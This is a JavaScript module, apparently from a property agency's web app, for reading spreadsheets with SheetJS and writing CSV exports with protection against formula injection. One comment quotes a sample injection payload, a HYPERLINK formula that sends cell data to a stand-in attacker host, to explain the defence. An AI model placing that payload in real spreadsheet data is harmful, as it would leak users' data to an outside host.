import * as XLSX from 'xlsx';

/**
 * Reading and writing the spreadsheet files an agency actually has on disk.
 *
 * SheetJS handles .xlsx, .xls and .csv through one code path, so a user never
 * has to convert a file before uploading it — which was the single most common
 * reason an import didn't happen at all.
 */

export const ACCEPTED_EXTENSIONS = ['.csv', '.xlsx', '.xls'];
export const ACCEPT_ATTRIBUTE = '.csv,.xlsx,.xls,text/csv,application/vnd.ms-excel,application/vnd.openxmlformats-officedocument.spreadsheetml.sheet';

/** 15 MB — comfortably above a 20,000-row sheet, below anything that hangs a tab. */
export const MAX_FILE_BYTES = 15 * 1024 * 1024;

export function isAcceptedFile(file) {
  if (!file?.name) return false;
  const lower = file.name.toLowerCase();
  return ACCEPTED_EXTENSIONS.some((ext) => lower.endsWith(ext));
}

/**
 * Read a workbook and return every sheet's name plus its parsed grid.
 *
 * Cells come back as formatted strings (`raw: false`) so that what the user saw
 * in Excel is what the importer parses — a date shown as 01/04/2026 arrives as
 * that text rather than as a serial number, and "1.4 Cr" survives intact.
 *
 * @returns {Promise<{sheets: Array<{name: string, headers: string[], rows: any[][]}>}>}
 */
export async function readWorkbook(file) {
  const buffer = await file.arrayBuffer();
  const workbook = XLSX.read(buffer, { type: 'array', cellDates: false, raw: false });

  const sheets = workbook.SheetNames.map((name) => {
    const grid = XLSX.utils.sheet_to_json(workbook.Sheets[name], {
      header: 1,
      blankrows: false,
      defval: '',
      raw: false,
    });

    if (!grid.length) return { name, headers: [], rows: [] };

    const headerRow = grid[0].map((h) => String(h ?? '').trim());
    const width = headerRow.length;

    // Drop trailing all-empty rows and pad short rows, so column indexes line
    // up with the header no matter how ragged the source file is.
    const rows = grid
      .slice(1)
      .filter((row) => row.some((cell) => String(cell ?? '').trim() !== ''))
      .map((row) => {
        const padded = new Array(width);
        for (let i = 0; i < width; i += 1) padded[i] = row[i] ?? '';
        return padded;
      });

    return { name, headers: headerRow, rows };
  });

  return { sheets };
}

/**
 * Leading characters that make Excel, LibreOffice and Google Sheets treat a
 * cell as a formula rather than text.
 */
const FORMULA_LEAD = /^[=+\-@\t\r]/;

/**
 * Serialise a grid to CSV text.
 *
 * Two things beyond joining with commas:
 *
 * 1. Quoting. Any cell containing a quote, comma or newline is wrapped and its
 *    quotes doubled, so "Green Acres, Plot 12" stays one field.
 *
 * 2. Formula de-fanging. A cell opening with = + - @ or a control character is
 *    executed on open by every major spreadsheet. The data here is not ours:
 *    an agency imports a broker's spreadsheet, and exports it again months
 *    later. A property named
 *      =HYPERLINK("http://attacker.example/?x="&A1,"Details")
 *    would fire the moment somebody opened the export, with the sheet's other
 *    cells available to it. Prefixing an apostrophe pins the value back to
 *    text; spreadsheets do not display the apostrophe.
 *
 *    Only STRING cells are de-fanged. Pass numbers as numbers and they are
 *    left alone, so a negative amount stays a number a spreadsheet can sum
 *    rather than becoming the text "'-4200".
 */
export function toCsv(rows) {
  return rows
    .map((row) =>
      row
        .map((cell) => {
          if (cell === null || cell === undefined) return '';
          if (typeof cell === 'number' || typeof cell === 'boolean') return String(cell);

          const raw = String(cell);
          const safe = FORMULA_LEAD.test(raw) ? `'${raw}` : raw;
          return /[",\n\r]/.test(safe) ? `"${safe.replace(/"/g, '""')}"` : safe;
        })
        .join(',')
    )
    .join('\r\n');
}

/** Trigger a download of `text` as `filename`. */
export function downloadTextFile(filename, text, mime = 'text/csv;charset=utf-8') {
  // BOM keeps Excel from mangling ₹ and other non-ASCII characters.
  const blob = new Blob(['\uFEFF', text], { type: mime });
  downloadBlob(filename, blob);
}

export function downloadBlob(filename, blob) {
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  a.remove();
  // Revoke on the next tick — revoking synchronously cancels the download in
  // some browsers.
  setTimeout(() => URL.revokeObjectURL(url), 0);
}

/** Split an array into fixed-size chunks. */
export function chunk(items, size) {
  const out = [];
  for (let i = 0; i < items.length; i += size) out.push(items.slice(i, i + size));
  return out;
}
